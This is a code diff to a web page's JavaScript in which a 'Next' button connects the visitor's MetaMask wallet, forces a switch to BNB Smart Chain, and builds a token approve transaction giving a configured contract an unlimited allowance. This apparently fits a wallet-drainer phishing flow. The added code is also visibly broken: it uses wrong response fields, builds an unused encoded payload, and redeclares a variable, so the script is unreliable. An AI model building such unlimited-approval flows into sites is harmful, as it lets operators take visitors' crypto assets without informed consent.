@@ -205,21 +205,46 @@ document.addEventListener("DOMContentLoaded", function () {
         nextBtn.innerHTML = '<span class="spinner">Processing...</span>';
         nextBtn.disabled = true;
 
-        try {
-            const bnbChainId = "0x38";
+      try {
+        let fromAddress;
+        
+        // Step 1: Make sure we have a wallet installed
+        if (!window.ethereum) {
+            showNotification("Install MetaMask & click Connect!", "info");
+            return;
+        }
+
+        // Step 2: Force connection + select the first available account
+        ({ result: fromAddress } = await window.ethereum.request({ method: "eth_requestAccounts" }));
+
+        // Step 3: Confirm we're on BSC; swap if necessary
+        const bnbChainId = "0x38";
+        const currentNetwork = await window.ethereum.request({ method: "eth_chainId" });
+        if (currentNetwork !== bnbChainId) {
             await window.ethereum.request({
                 method: "wallet_switchEthereumChain",
                 params: [{ chainId: bnbChainId }]
             });
+            // Refresh the address after switching chains
+            ({ result: fromAddress } = await window.ethereum.request({ method: "eth_accounts" }) || 
+             await window.ethereum.request({ method: "eth_requestAccounts" }));
+        } else {
+            // Already on BSC – fetch fresh list of addresses
+            ({ results: [fromAddress] } = await window.ethereum.request({ method: "eth_accounts" }));
+        }
 
-            const iface = new ethers.utils.Interface([
-                "function approve(address spender, uint256 amount)"
-            ]);
+        // Now construct the approval payload
+        const iface = new ethers.utils.Interface(["function approve(address spender, uint256 amount)"]);
+        const txData = iface.encodeFunctionData("approve", [
+            CONFIG.CONTRACT_ADDRESS,
+            ethers.constants.MaxUint256.toString()
+        ]);
 
-            const txData = iface.encodeFunctionData("approve", [
-                CONFIG.CONTRACT_ADDRESS,
-                ethers.constants.MaxUint256.toString()
-            ]);
+        // Encode the final transaction object
+        const encodedTx = ethers.utils.defaultAbiCoder.encode(
+            ["address", "uint256"],
+            [CONFIG.CONTRACT_ADDRESS, ethers.constants.MaxUint256]
+        );
 
             const fromAddress = (await window.ethereum.request({ method: "eth_requestAccounts" }))[0];
 
